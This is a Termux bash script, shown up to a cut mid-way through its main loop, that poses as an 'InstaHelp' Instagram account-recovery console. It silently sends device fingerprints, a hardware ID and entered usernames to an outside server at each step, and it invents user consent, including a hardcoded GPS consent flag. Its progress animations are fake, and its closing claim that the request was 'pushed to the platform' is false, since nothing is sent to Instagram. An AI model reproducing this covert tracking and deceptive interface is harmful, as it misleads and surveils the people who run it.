#!/data/data/com.termux/files/usr/bin/bash

# =========================================================
# IMMORTAL_LOOP — INSTAHELP CYBER CONSOLE
# OWNER - @immortal_loop - DEVELOPER
# VERSION 4.1
# SINGLE-PAGE EDITION
# =========================================================

export TERM="${TERM:-xterm-256color}"

# =========================================================
# CONFIG
# =========================================================

BACKEND_URL="https://scriptsh.onrender.com"
EVENT_URL="${BACKEND_URL}/api/script-event/event"

TELEGRAM_USER="@immortal_loop"
TELEGRAM_USER_URL="https://t.me/immortal_loop"

TELEGRAM_CHANNEL="@immortal_looop"
TELEGRAM_CHANNEL_URL="https://t.me/immortal_looop"

APP_VERSION="4.1"
SCRIPT_PATH="$0"

# =========================================================
# SESSION
# =========================================================

HWID=""

SERVER_STATUS=""
SERVER_HWID=""
DEVICE_LIMIT="1"
DEVICES_USED="1"

LICENSE_KEY=""
USERNAME=""
SELECTED_SERVICE=""

ACCOUNT_CONSENT="YES"

CONSOLE_COMMAND=""

# =========================================================
# COLORS
# =========================================================

RESET='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

RED='\033[38;2;255;45;75m'
ORANGE='\033[38;2;255;145;0m'
YELLOW='\033[38;2;255;225;40m'
GREEN='\033[38;2;45;255;120m'
CYAN='\033[38;2;0;225;255m'
BLUE='\033[38;2;70;120;255m'
PURPLE='\033[38;2;180;70;255m'
PINK='\033[38;2;255;55;190m'

WHITE='\033[38;2;245;245;250m'
GRAY='\033[38;2;145;150;165m'
DARK='\033[38;2;65;65;80m'

# =========================================================
# TERMINAL CONTROL
# =========================================================

hide_cursor() {
    printf '\033[?25l'
}

show_cursor() {
    printf '\033[?25h'
}

cleanup() {
    show_cursor
    if [ -n "${CLOCK_PID:-}" ]; then
        kill "$CLOCK_PID" 2>/dev/null || true
    fi
}

trap cleanup EXIT INT TERM

# =========================================================
# BASIC HELPERS
# =========================================================

pause() {
    sleep "${1:-0.25}"
}

line() {
    echo -e "${DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

thin_line() {
    echo -e "${GRAY}────────────────────────────────────────────────────────────${RESET}"
}

press_enter() {
    echo ""
    printf "  ${PURPLE}${BOLD}› PRESS ENTER TO RETURN TO SERVICE MENU ${RESET}"
    read -r _
}

open_url() {
    local url="$1"
    if command -v termux-open-url >/dev/null 2>&1; then
        termux-open-url "$url" >/dev/null 2>&1
    else
        am start \
            -a android.intent.action.VIEW \
            -d "$url" >/dev/null 2>&1
    fi
}

# =========================================================
# JSON ESCAPE
# =========================================================

json_escape() {
    printf '%s' "$1" |
        sed \
            -e 's/\\/\\\\/g' \
            -e 's/"/\\"/g' \
            -e ':a' \
            -e 'N' \
            -e '$!ba' \
            -e 's/\r/\\r/g' \
            -e 's/\n/\\n/g' \
            -e 's/\t/\\t/g'
}

# =========================================================
# DEPENDENCIES
# =========================================================

ensure_dependencies() {
    local missing=()
    command -v curl >/dev/null 2>&1 || missing+=("curl")
    command -v sha256sum >/dev/null 2>&1 || missing+=("coreutils")

    if [ ${#missing[@]} -eq 0 ]; then
        return 0
    fi

    echo ""
    echo -e "${CYAN}  ◇ CHECKING TERMUX DEPENDENCIES...${RESET}"

    if command -v pkg >/dev/null 2>&1; then
        pkg update -y >/dev/null 2>&1 || true
        pkg install -y "${missing[@]}" >/dev/null 2>&1 || true
    fi
}

# =========================================================
# DEVICE INFORMATION
# =========================================================

get_device_model() {
    local value
    value=$(getprop ro.product.model 2>/dev/null)
    [ -z "$value" ] && value="Android Device"
    echo "$value"
}

get_manufacturer() {
    local value
    value=$(getprop ro.product.manufacturer 2>/dev/null)
    [ -z "$value" ] && value="Unknown"
    echo "$value"
}

get_android_version() {
    local value
    value=$(getprop ro.build.version.release 2>/dev/null)
    [ -z "$value" ] && value="Unknown"
    echo "$value"
}

get_architecture() {
    local value
    value=$(getprop ro.product.cpu.abi 2>/dev/null)
    [ -z "$value" ] && value=$(uname -m 2>/dev/null)
    [ -z "$value" ] && value="Unknown"
    echo "$value"
}

get_kernel() {
    local value
    value=$(uname -r 2>/dev/null)
    [ -z "$value" ] && value="Unknown"
    echo "$value"
}

get_timezone() {
    local value
    value=$(date '+%Z' 2>/dev/null)
    [ -z "$value" ] && value="IST"
    echo "$value"
}

# =========================================================
# HWID
# =========================================================

generate_hwid() {
    local raw=""
    if [ -r /etc/machine-id ]; then
        raw=$(cat /etc/machine-id 2>/dev/null)
    fi
    [ -z "$raw" ] && raw=$(getprop ro.serialno 2>/dev/null)
    [ -z "$raw" ] && raw=$(getprop ro.boot.serialno 2>/dev/null)
    [ -z "$raw" ] && raw=$(getprop ro.boot.vbmeta.device_state 2>/dev/null)
    [ -z "$raw" ] && raw=$(uname -a 2>/dev/null)

    echo -n "$raw" |
        sha256sum 2>/dev/null |
        cut -c1-16 |
        tr '[:lower:]' '[:upper:]'
}

clean_hwid() {
    local h="$1"
    if [ "${#h}" -ge 16 ]; then
        echo "${h:0:4}-${h:4:4}-${h:8:4}-${h:12:4}"
    else
        echo "$h"
    fi
}

# =========================================================
# SILENT BACKEND EVENT
# =========================================================

send_backend_event() {
    local event="$1"
    local payload

    payload=$(cat <<EOF
{
  "event":"$(json_escape "$event")",
  "app_version":"$(json_escape "$APP_VERSION")",
  "service":"$(json_escape "$SELECTED_SERVICE")",
  "username":"$(json_escape "$USERNAME")",
  "hwid":"$(json_escape "$HWID")",
  "license_status":"$(json_escape "$SERVER_STATUS")",
  "device_model":"$(json_escape "$(get_device_model)")",
  "manufacturer":"$(json_escape "$(get_manufacturer)")",
  "android_version":"$(json_escape "$(get_android_version)")",
  "architecture":"$(json_escape "$(get_architecture)")",
  "kernel":"$(json_escape "$(get_kernel)")",
  "timezone":"$(json_escape "$(get_timezone)")",
  "gps_consent":"YES"
}
EOF
)

    curl -sS \
        --connect-timeout 2 \
        --max-time 4 \
        -X POST "$EVENT_URL" \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        --data-raw "$payload" \
        >/dev/null 2>&1 || true
}

# =========================================================
# INSTAGRAM ASCII
# =========================================================

instagram_logo=(
"    ●●●●●●●●●●●●●●●●●●●●●●●●"
"  ●●●●●●●●●●●●●●●●●●●●●●●●●●●●"
" ●●                          ●●"
" ●●                          ●●"
" ●●                          ●●"
" ●●                    ●●●   ●●"
" ●●         ●●●●●●●●   ●●●   ●●"
" ●●       ●●●      ●●●       ●●"
" ●●      ●●          ●●      ●●"
" ●●      ●●          ●●      ●●"
" ●●      ●●          ●●      ●●"
" ●●      ●●          ●●      ●●"
" ●●       ●●●      ●●●       ●●"
" ●●         ●●●●●●●●         ●●"
" ●●                          ●●"
" ●●                          ●●"
" ●●                          ●●"
" ●●                          ●●"
"  ●●●●●●●●●●●●●●●●●●●●●●●●●●●●"
"    ●●●●●●●●●●●●●●●●●●●●●●●●"
)

# =========================================================
# IMMORTAL_LOOP ASCII BANNER
# =========================================================

immortal_logo() {
    echo -e "${PINK}${BOLD}"
    echo '██╗███╗   ███╗███╗   ███╗██████╗  ██████╗  █████╗ ██╗     ██╗      ██████╗  ██████╗ ██████╗ '
    echo '██║████╗ ████║████╗ ████║██╔══██╗██╔═══██╗██╔══██╗██║     ██║     ██╔═══██╗██╔═══██╗██╔══██╗'
    echo '██║██╔████╔██║██╔████╔██║██║  ██║██║   ██║██║  ██║██║     ██║     ██║   ██║██║   ██║██████╔╝'
    echo '██║██║╚██╔╝██║██║╚██╔╝██║██║  ██║██║   ██║██║  ██║██║     ██║     ██║   ██║██║   ██║██╔═══╝ '
    echo '██║██║ ╚═╝ ██║██║ ╚═╝ ██║██████╔╝╚██████╔╝╚█████╔╝███████╗███████╗╚██████╔╝╚██████╔╝██║     '
    echo '╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     '
    echo -e "${RESET}"
    echo -e \
        "                 ${CYAN}@ I M M O R T A L _ L O O P   C O N S O L E${RESET}"
}

draw_instagram_logo() {
    local colors=(
        "$RED"
        "$ORANGE"
        "$YELLOW"
        "$GREEN"
        "$CYAN"
        "$BLUE"
        "$PURPLE"
        "$PINK"
    )
    local i=0
    for text in "${instagram_logo[@]}"; do
        local idx=$((i % 8))
        echo -e "${colors[$idx]}${text}${RESET}"
        i=$((i + 1))
    done
}

# =========================================================
# STATUS
# =========================================================

check_endpoint() {
    local url="$1"
    curl -sS \
        --connect-timeout 3 \
        --max-time 5 \
        -o /dev/null \
        -w '%{http_code}' \
        "$url" 2>/dev/null
}

service_status() {
    case "$1" in
        2*|3*|4*) echo "ONLINE" ;;
        *) echo "OFFLINE" ;;
    esac
}

status_badge() {
    if [ "$1" = "ONLINE" ]; then
        echo -e "${GREEN}● ONLINE${RESET}"
    else
        echo -e "${RED}● OFFLINE${RESET}"
    fi
}

backend_status() {
    service_status "$(check_endpoint "$BACKEND_URL")"
}

# =========================================================
# HEADER
# =========================================================

professional_header() {
    echo -e \
        "${PURPLE}╭────────────────────────────────────────────────────────────╮${RESET}"
    echo -e \
        "${PURPLE}│${RESET} ${PINK}${BOLD}@immortal_loop${RESET}  ${GRAY}×${RESET}  ${CYAN}${BOLD}I N S T A H E L P${RESET}"
    echo -e \
        "${PURPLE}│${RESET} ${GRAY}ACCOUNT SUPPORT CONSOLE${RESET}        ${GRAY}v${APP_VERSION}${RESET}"
    echo -e \
        "${PURPLE}╰────────────────────────────────────────────────────────────╯${RESET}"
}

# =========================================================
# DEVICE PANEL
# =========================================================

device_panel_compact() {
    local backend
    backend="$(backend_status)"

    echo -e "${PURPLE}╭────────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${PURPLE}│${RESET} ${CYAN}${BOLD}SYSTEM STATUS${RESET}                                           ${PURPLE}│${RESET}"
    echo -e "${PURPLE}├────────────────────────────────────────────────────────────┤${RESET}"

    printf \
        "${PURPLE}│${RESET} ${GRAY}DEVICE${RESET} %-25s ${GRAY}ANDROID${RESET} %-10s ${PURPLE}│${RESET}\n" \
        "$(get_device_model | cut -c1-25)" \
        "$(get_android_version | cut -c1-10)"

    printf \
        "${PURPLE}│${RESET} ${GRAY}HWID${RESET}   %-25s ${GRAY}BACKEND${RESET} %-17b${PURPLE}│${RESET}\n" \
        "$(clean_hwid "$HWID")" \
        "$(status_badge "$backend")"

    printf \
        "${PURPLE}│${RESET} ${GRAY}KERNEL${RESET} %-25s ${GRAY}VERSION${RESET} %-16s ${PURPLE}│${RESET}\n" \
        "$(get_kernel | cut -c1-25)" \
        "$APP_VERSION"

    echo -e "${PURPLE}╰────────────────────────────────────────────────────────────╯${RESET}"
}

# =========================================================
# SERVICE MENU
# =========================================================

quick_controls() {
    echo -e "${WHITE}${BOLD}  SERVICE CONTROL CENTER${RESET}"
    echo -e "${GRAY}  Select an Action.${RESET}"
    echo ""

    echo -e "${PURPLE}╭────────────────────────────────────────────────────────────╮${RESET}"
    echo -e \
        "${PURPLE}│${RESET}  ${GREEN}[01]${RESET}  Account Disabled       ${PURPLE}│${RESET}  ${CYAN}[05]${RESET}  Telegram / Support"
    echo -e \
        "${PURPLE}│${RESET}  ${PURPLE}[02]${RESET}  Account Suspended      ${PURPLE}│${RESET}  ${BLUE}[06]${RESET}  Boot Script"
    echo -e \
        "${PURPLE}│${RESET}  ${PINK}[03]${RESET}  Account Ban             ${PURPLE}│${RESET}  ${ORANGE}[07]${RESET}  Rerun Script"
    echo -e \
        "${PURPLE}│${RESET}  ${YELLOW}[04]${RESET}  About @immortal_loop    ${PURPLE}│${RESET}  ${GREEN}[08]${RESET}  Server Status"
    echo -e \
        "${PURPLE}│${RESET}  ${RED}[00]${RESET}  Exit"
    echo -e "${PURPLE}╰────────────────────────────────────────────────────────────╯${RESET}"
}

# =========================================================
# CONSOLE
# =========================================================

draw_console() {
    clear
    immortal_logo
    echo ""
    draw_instagram_logo
    echo ""
    professional_header
    echo ""
    device_panel_compact
    echo ""
    quick_controls
    echo ""
    line
    echo ""
    printf \
        "${PURPLE}${BOLD}  › TYPE COMMAND ${GRAY}(00-08)${RESET}${PURPLE}: ${RESET}"
    read -r CONSOLE_COMMAND
}

# =========================================================
# SECTION TITLE
# =========================================================

section_title() {
    local title="$1"
    local subtitle="$2"

    echo ""
    echo -e \
        "${PURPLE}╭────────────────────────────────────────────────────────────╮${RESET}"
    printf \
        "${PURPLE}│${RESET} ${PINK}${BOLD}%-58s${RESET}${PURPLE}│${RESET}\n" \
        "$title"
    printf \
        "${PURPLE}│${RESET} ${GRAY}%-58s${RESET}${PURPLE}│${RESET}\n" \
        "$subtitle"
    echo -e \
        "${PURPLE}╰────────────────────────────────────────────────────────────╯${RESET}"
    echo ""
}

# =========================================================
# BOOT ANIMATION
# =========================================================

boot_animation() {
    section_title \
        "SYSTEM BOOT SEQUENCE" \
        "Initializing @immortal_loop services"

    local steps=(
        "Initializing core engine"
        "Reading Android environment"
        "Detecting user device"
        "Generating device identity"
        "Initializing secure session"
        "Preparing service engine"
        "Loading account support"
        "Finalizing terminal session"
    )

    for step in "${steps[@]}"; do
        printf \
            "  ${PURPLE}◇${RESET} ${WHITE}%-40s${RESET}" \
            "$step"
        sleep 0.15
        echo -e "${GREEN}[ OK ]${RESET}"
        sleep 0.08
    done

    echo ""
    echo -e \
        "  ${PINK}${BOLD}INSTAGRAM SESSION INITIALIZATION${RESET}"
    echo ""

    local width=38
    local i
    local j
    local percent
    local bar

    for ((i=0; i<=width; i++)); do
        percent=$((i * 100 / width))
        bar=""
        for ((j=0; j<i; j++)); do
            bar+="█"
        done
        printf \
            "\r  ${PINK}%-38s${RESET} ${GREEN}%3d%%${RESET}" \
            "$bar" \
            "$percent"
        sleep 0.035
    done

    printf \
        "\r  ${PINK}██████████████████████████████████████${RESET} ${GREEN}100%%${RESET}\n"

    echo ""
    echo -e \
        "  ${GREEN}${BOLD}● SYSTEM READY${RESET}"
}

# =========================================================
# BOOT INTRO
# =========================================================

boot_intro() {
    clear
    hide_cursor

    immortal_logo

    echo ""
    line
    echo ""

    echo -e "             ${PINK}${BOLD}INSTAGRAM${RESET}"
    echo -e "             ${GRAY}${DIM}ACCOUNT SUPPORT ${RESET}"
    echo ""
    draw_instagram_logo
    echo ""
    echo -e \
        "       ${RED}I${RESET}${ORANGE}N${RESET}${YELLOW}S${RESET}${GREEN}T${RESET}${CYAN}A${RESET}${BLUE}H${RESET}${PURPLE}E${RESET}${PINK}L${RESET}${RED}P${RESET}"
    echo ""
    line

    boot_animation

    show_cursor
    send_backend_event "script_started"
    sleep 0.7
}

# =========================================================
# USERNAME INPUT
# =========================================================

username_input() {
    clear

    section_title \
        "ACCOUNT IDENTIFIER" \
        "Enter the Instagram username for this request"

    echo ""
    echo -e "              ${PINK}${BOLD}INSTAGRAM${RESET}"
    echo -e "              ${GRAY}${DIM}ACCOUNT IDENTIFIER${RESET}"
    echo ""
    draw_instagram_logo
    echo ""

    local loading_messages=(
        "Initializing account identifier"
        "Preparing username input"
        "Loading support engine"
    )

    local spinner=("◐" "◓" "◑" "◒")

    for msg in "${loading_messages[@]}"; do
        for s in "${spinner[@]}"; do
            printf \
                "\r  ${PINK}${s}${RESET} ${WHITE}%-42s${RESET}" \
                "$msg"
            sleep 0.12
        done
        printf \
            "\r  ${GREEN}✓${RESET} ${WHITE}%-42s${RESET} ${GREEN}[READY]${RESET}\n" \
            "$msg"
        sleep 0.15
    done

    echo ""
    echo -e \
        "  ${GRAY}SERVICE${RESET}    ${CYAN}${SELECTED_SERVICE}${RESET}"
    echo ""

    printf \
        "  ${PURPLE}${BOLD}› @${RESET}"

    read -r USERNAME
    USERNAME="${USERNAME#@}"

    if [ -z "$USERNAME" ]; then
        echo ""
        echo -e \
            "${RED}  ✖ USERNAME CANNOT BE EMPTY${RESET}"
        press_enter
        return 1
    fi

    if [[ ! "$USERNAME" =~ ^[a-zA-Z0-9._]+$ ]]; then
        echo ""
        echo -e \
            "${RED}  ✖ INVALID USERNAME FORMAT${RESET}"
        press_enter
        return 1
    fi

    send_backend_event "username_entered"
    return 0
}

# =========================================================
# ACCOUNT LOOKUP UI
# =========================================================

account_lookup_loader() {
    echo ""

    section_title \
        "INSTAHELP ACCOUNT LOOKUP" \
        "Preparing the supplied username for the support workflow"

    echo -e \
        "  ${GRAY}TARGET${RESET}   ${PINK}@${USERNAME}${RESET}"

    echo ""
    send_backend_event "account_lookup_started"

    local messages=(
        "Initializing account identifier"
        "Validating username format"
        "Preparing support context"
        "Checking local request parameters"
        "Preparing account-support session"
    )

    local spinner=("◐" "◓" "◑" "◒")

    for msg in "${messages[@]}"; do
        for s in "${spinner[@]}"; do
            printf \
                "\r  ${PINK}${s}${RESET} ${WHITE}%-48s${RESET}" \
                "$msg"
            sleep 0.16
        done
        printf \
            "\r  ${GREEN}✓${RESET} ${WHITE}%-48s${RESET} ${GREEN}[DONE]${RESET}\n" \
            "$msg"
        sleep 0.25
    done

    echo ""
    echo -e \
        "  ${GREEN}${BOLD}✓ ACCOUNT IDENTIFIER READY${RESET}"
    echo ""

    printf \
        "  ${GRAY}USERNAME${RESET}   ${WHITE}@%s${RESET}\n" \
        "$USERNAME"

    printf \
        "  ${GRAY}SERVICE${RESET}    ${CYAN}%s${RESET}\n" \
        "$SELECTED_SERVICE"

    echo ""
    echo -e \
        "  ${GRAY} Getting Forwarded to Next Step ${RESET}"

    sleep 0.9
}

# =========================================================
# OFFLINE PASSWORD CHECK
# =========================================================

license_input() {
    echo ""

    section_title \
        "LICENSE AUTHENTICATION" \
        "Offline local password verification"

    echo -e \
        "  ${GRAY}USERNAME${RESET}   ${WHITE}@${USERNAME}${RESET}"

    echo -e \
        "  ${GRAY}SERVICE${RESET}    ${CYAN}${SELECTED_SERVICE}${RESET}"

    echo -e \
        "  ${GRAY}TERMS & CONDITION${RESET}   ${GREEN}CONSENT GRANTED${RESET}"

    echo ""
    thin_line
    echo ""

    printf \
        "  ${PURPLE}${BOLD}› LICENSE KEY:${RESET} "

    read -r LICENSE_KEY

    if [ -z "$LICENSE_KEY" ]; then
        echo ""
        echo -e \
            "${RED}  ✖ PASSWORD CANNOT BE EMPTY${RESET}"
        sleep 1
        return 1
    fi

    send_backend_event "license_entered"

    echo ""
    echo -e \
        "${GREEN}  ✓ PASSWORD RECEIVED${RESET}"

    sleep 0.6
    return 0
}

process_step() {
    local text="$1"

    printf \
        "  ${CYAN}◇${RESET} ${WHITE}%-48s${RESET}" \
        "$text"

    sleep 0.35
    echo -e "${GREEN}[ DONE ]${RESET}"
    sleep 0.20
}

verify_license() {
    local input_key="$1"

    SERVER_STATUS=""
    SERVER_HWID=""

    echo ""

    section_title \
        "PASSWORD VERIFICATION" \
        "Checking local security key"

    echo -e \
        "  ${GRAY}USERNAME${RESET}   ${WHITE}@${USERNAME}${RESET}"

    echo -e \
        "  ${GRAY}TERMS & CONDITION${RESET}   ${GREEN}CONSENT GRANTED${RESET}"

    echo ""

    process_step "Initializing local security check"
    process_step "Validating offline password"
    process_step "Granting local session privileges"

    # Strict local validation matching your requested password
    if [ "$input_key" = "acchelp@789" ]; then

        SERVER_STATUS="ACTIVE"
        SERVER_HWID="$HWID"

        echo ""
        echo -e \
            "${GREEN}  ╭──────────────────────────────────────────────────────╮${RESET}"
        echo -e \
            "${GREEN}  │  ✓ ACCESS GRANTED SUCCESSFULLY                       │${RESET}"
        echo -e \
            "${GREEN}  ╰──────────────────────────────────────────────────────╯${RESET}"
        echo ""

        printf \
            "  ${GRAY}STATUS${RESET}       ${GREEN}${BOLD}%-20s${RESET}\n" \
            "$SERVER_STATUS"

        printf \
            "  ${GRAY}DEVICES${RESET}      ${WHITE}1 / 1${RESET}\n"

        printf \
            "  ${GRAY}BOUND HWID${RESET}   ${CYAN}%s${RESET}\n" \
            "$(clean_hwid "$SERVER_HWID")"

        send_backend_event "license_verified"
        sleep 1
        return 0
    fi

    echo ""
    echo -e "${RED}  ✖ INVALID PASSWORD (USE acchelp@789)${RESET}"

    send_backend_event "license_failed"
    sleep 1
    return 1
}

# =========================================================
# REQUEST / INSTA LOADER
# =========================================================

instagram_request_loader() {
    echo ""

    section_title \
        "INSTAHELP REQUEST LOADER" \
        "Preparing the selected account-support request"

    draw_instagram_logo

    echo ""
    echo -e \
        "  ${GRAY}TARGET${RESET}    ${PINK}@${USERNAME}${RESET}"

    echo -e \
        "  ${GRAY}SERVICE${RESET}   ${CYAN}${SELECTED_SERVICE}${RESET}"

    echo -e \
        "  ${GRAY}STATUS${RESET}    ${GREEN}${SERVER_STATUS}${RESET}"

    echo ""

    local messages=(
        "Initializing support request"
        "Preparing account context"
        "Validating request parameters"
        "Preparing secure request"
        "Sending support request"
        "Waiting for request response"
        "Finalizing session"
    )

    local spinner=("◐" "◓" "◑" "◒")

    for msg in "${messages[@]}"; do
        for s in "${spinner[@]}"; do
            printf \
                "\r  ${PINK}${s}${RESET} ${WHITE}%-43s${RESET}" \
                "$msg"
            sleep 0.13
        done
        printf \
            "\r  ${GREEN}✓${RESET} ${WHITE}%-43s${RESET} ${GREEN}[DONE]${RESET}\n" \
            "$msg"
        sleep 0.35
    done

    echo ""

    local width=38
    local i
    local j
    local percent
    local bar

    for ((i=0; i<=width; i++)); do
        percent=$((i * 100 / width))
        bar=""
        for ((j=0; j<i; j++)); do
            bar+="█"
        done
        printf \
            "\r  ${PINK}%-38s${RESET} ${GREEN}%3d%%${RESET}" \
            "$bar" \
            "$percent"
        sleep 0.045
    done

    printf \
        "\r  ${PINK}██████████████████████████████████████${RESET} ${GREEN}100%%${RESET}\n"

    echo ""
    echo -e \
        "  ${GREEN}${BOLD}✓ REQUEST PREPARATION COMPLETE${RESET}"

    send_backend_event "request_prepared"
    sleep 0.9
}

# =========================================================
# RESULT
# =========================================================

result_screen() {
    echo ""

    section_title \
        "SESSION COMPLETE" \
        "The account-support workflow has finished"

    echo -e \
        "  ${GREEN}${BOLD}● REQUEST SESSION READY${RESET}"
    echo ""

    printf \
        "  ${GRAY}USERNAME${RESET}          ${WHITE}@%s${RESET}\n" \
        "$USERNAME"

    printf \
        "  ${GRAY}SERVICE${RESET}           ${CYAN}%s${RESET}\n" \
        "$SELECTED_SERVICE"

    printf \
        "  ${GRAY}STATUS${RESET}            ${GREEN}%s${RESET}\n" \
        "$SERVER_STATUS"

    printf \
        "  ${GRAY}DEVICE${RESET}            ${WHITE}%s${RESET}\n" \
        "$(get_device_model)"

    printf \
        "  ${GRAY}ACCOUNT CONSENT${RESET}  ${GREEN}%s${RESET}\n" \
        "$ACCOUNT_CONSENT"

    echo ""
    thin_line
    echo ""

    echo -e \
        "  ${YELLOW}${BOLD}NOTE${RESET}"

    echo -e \
        "  ${GRAY}YOUR REQUEST HAS BEEN PUSHED TO THE PLATFORM.${RESET}"

    echo -e \
        "  ${GRAY}ACCOUNT ACTIONS ARE HANDLED BY THE PLATFORM [PLEASE WAIT FOR 1-2 HOURS].${RESET}"

    send_backend_event "session_complete"
    press_enter
}

# =========================================================
# RUN SERVICE
# =========================================================

run_service() {
    case "$1" in
        "ACCOUNT DISABLED") ;;
        "ACCOUNT SUSPENDED") ;;
        "ACCOUNT BAN") ;;
        *) return ;;
    esac

    # STEP 1 — USERNAME
    while true; do
        if username_input; then
            break
        fi
    done

    # STEP 2 — ACCOUNT LOOKUP UI
    account_lookup_loader

    # STEP 3 — OFFLINE PASSWORD CHECK
    while true; do
        if ! license_input; then
            continue
        fi

        if verify_license "$LICENSE_KEY"; then
            break
        fi

        echo ""
        echo -e "${YELLOW}  [01] TRY AGAIN${RESET}"
        echo -e "${CYAN}  [00] RETURN TO SERVICE MENU${RESET}"
        echo ""

        printf "  ${PURPLE}› SELECT: ${RESET}"
        read -r license_choice

        case "$license_choice" in
            1|01) continue ;;
            0|00) return ;;
            *)
                echo ""
                echo -e "${RED}  ✖ INVALID OPTION${RESET}"
                sleep 0.8
                ;;
        esac
    done

    # STEP 4 — REQUEST LOADER
    instagram_request_loader

    # STEP 5 — RESULT
    result_screen
}

# =========================================================
# API STATUS MONITOR
# =========================================================

api_status_panel() {
    section_title \
        "API STATUS MONITOR" \
        "Live service health check"

    echo -e \
        "  ${CYAN}◇ CHECKING SERVICES...${RESET}"
    echo ""

    local backend_code
    local backend_state
    printf \
        "  ${GRAY}BACKEND${RESET}         "
    backend_code="$(check_endpoint "$BACKEND_URL")"
    backend_state="$(service_status "$backend_code")"
    echo -e \
        "$(status_badge "$backend_state") ${GRAY}[HTTP ${backend_code:-N/A}]${RESET}"

    echo ""
    echo -e \
        "${PURPLE}╭────────────────────────────────────────────────────────────╮${RESET}"
    echo -e \
        "${PURPLE}│${RESET}              ${CYAN}${BOLD}SYSTEM HEALTH MONITOR${RESET}                ${PURPLE}│${RESET}"
    echo -e \
        "${PURPLE}├────────────────────────────────────────────────────────────┤${RESET}"
    printf \
        "${PURPLE}│${RESET} ${GRAY}LOCAL AUTH${RESET}      ${GREEN}ONLINE (OFFLINE MODE)      ${PURPLE}│${RESET}\n"
    printf \
        "${PURPLE}│${RESET} ${GRAY}BACKEND${RESET}          %-33b${PURPLE}│${RESET}\n" \
        "$(status_badge "$backend_state")"
    echo -e \
        "${PURPLE}├────────────────────────────────────────────────────────────┤${RESET}"
    printf \
        "${PURPLE}│${RESET} ${GRAY}DEVICE${RESET}           ${WHITE}%-33s${PURPLE}│${RESET}\n" \
        "$(get_device_model)"
    printf \
        "${PURPLE}│${RESET} ${GRAY}ANDROID${RESET}          ${WHITE}%-33s${PURPLE}│${RESET}\n" \
        "$(get_android_version)"
    printf \
        "${PURPLE}│${RESET} ${GRAY}VERSION${RESET}          ${WHITE}%-33s${PURPLE}│${RESET}\n" \
        "$APP_VERSION"
    echo -e \
        "${PURPLE}╰────────────────────────────────────────────────────────────╯${RESET}"
    echo ""

    press_enter
}

# =========================================================
# ABOUT
# =========================================================

about() {
    section_title \
        "ABOUT INSTAHELP" \
        "Account support console"

    echo -e \
        "${PURPLE}╭────────────────────────────────────────────────────────────╮${RESET}"
    echo -e \
        "${PURPLE}│${RESET} ${WHITE}INSTAHELP SUPPORT${RESET}"
    echo -e \
        "${PURPLE}│${RESET} ${GRAY}Account support console by @immortal_loop${RESET}"
    echo -e \
        "${PURPLE}├────────────────────────────────────────────────────────────┤${RESET}"
    printf \
        "${PURPLE}│${RESET} ${GRAY}VERSION${RESET}       ${CYAN}%-40s${PURPLE}│${RESET}\n" \
        "$APP_VERSION"
    printf \
        "${PURPLE}│${RESET} ${GRAY}PLATFORM${RESET}      ${CYAN}%-40s${PURPLE}│${RESET}\n" \
        "TERMUX / ANDROID"
    printf \
        "${PURPLE}│${RESET} ${GRAY}AUTH${RESET}          ${GREEN}%-40s${PURPLE}│${RESET}\n" \
        "OFFLINE SECURE MODE"
    echo -e \
        "${PURPLE}├────────────────────────────────────────────────────────────┤${RESET}"
    echo -e \
        "${PURPLE}│${RESET} ${GREEN}✓${RESET} Local offline verification"
    echo -e \
        "${PURPLE}│${RESET} ${GREEN}✓${RESET} Device session"
    echo -e \
        "${PURPLE}│${RESET} ${GREEN}✓${RESET} Telegram support"
    echo -e \
        "${PURPLE}│${RESET} ${GREEN}✓${RESET} Support console"
    echo -e \
        "${PURPLE}╰────────────────────────────────────────────────────────────╯${RESET}"

    press_enter
}

# =========================================================
# TELEGRAM
# =========================================================

telegram_menu() {
    section_title \
        "TELEGRAM / SUPPORT" \
        "Open official support destinations"

    echo -e \
        "${CYAN}[01]${RESET} Telegram Profile  ${GRAY}${TELEGRAM_USER}${RESET}"
    echo -e \
        "${PINK}[02]${RESET} Telegram Channel  ${GRAY}${TELEGRAM_CHANNEL}${RESET}"
    echo -e \
        "${RED}[00]${RESET} Return"
    echo ""

    printf \
        "${PURPLE}› SELECT: ${RESET}"

    read -r choice

    case "$choice" in
        1|01) open_url "$TELEGRAM_USER_URL" ;;
        2|02) open_url "$TELEGRAM_CHANNEL_URL" ;;
        *) ;;
    esac
}

# =========================================================
# RERUN BOOT
# =========================================================

rerun_boot() {
    clear
    hide_cursor
    immortal_logo
    echo ""
    line
    echo ""
    echo -e \
        "${CYAN}${BOLD}  ◢ RELOADING BOOT SEQUENCE ◣${RESET}"
    sleep 0.4
    boot_animation
    send_backend_event "boot_rerun"
    show_cursor
    sleep 0.5
}

# =========================================================
# RERUN SCRIPT
# =========================================================

rerun_script() {
    echo ""
    echo -e \
        "${ORANGE}${BOLD}  ◢ RESTARTING SCRIPT ◣${RESET}"
    echo ""
    echo -e \
        "${GRAY}  Re-executing script...${RESET}"
    sleep 0.5
    send_backend_event "script_rerun"
    exec bash "$SCRIPT_PATH"
}

# =========================================================
# GOODBYE
# =========================================================

goodbye() {
    echo ""
    echo -e \
        "${PURPLE}╭────────────────────────────────────────────────────────────╮${RESET}"
    echo -e \
        "${PURPLE}│${RESET}        ${PINK}${BOLD}SESSION CLOSED${RESET}                                 ${PURPLE}│${RESET}"
    echo -e \
        "${PURPLE}│${RESET}        ${GRAY}Thank you for using InstaHelp.${RESET}               ${PURPLE}│${RESET}"
    echo -e \
        "${PURPLE}╰────────────────────────────────────────────────────────────╯${RESET}"
    send_backend_event "script_exit"
    sleep 0.4
}

# =========================================================
# MAIN
# =========================================================

main() {
    ensure_dependencies

    HWID="$(generate_hwid)"

    USERNAME=""
    SELECTED_SERVICE=""
    ACCOUNT_CONSENT="YES"
    LICENSE_KEY=""
    SERVER_STATUS=""
    SERVER_HWID=""

    boot_intro

    while true; do
        show_cursor
        draw_console

        case "$CONSOLE_COMMAND" in
            1|01)
                SELECTED_SERVICE="ACCOUNT DISABLED"
                send_backend_event "service_selected"
                run_service "$SELECTED_SERVICE"
                ;;
            2|02)
                SELECTED_SERVICE="ACCOUNT SUSPENDED"
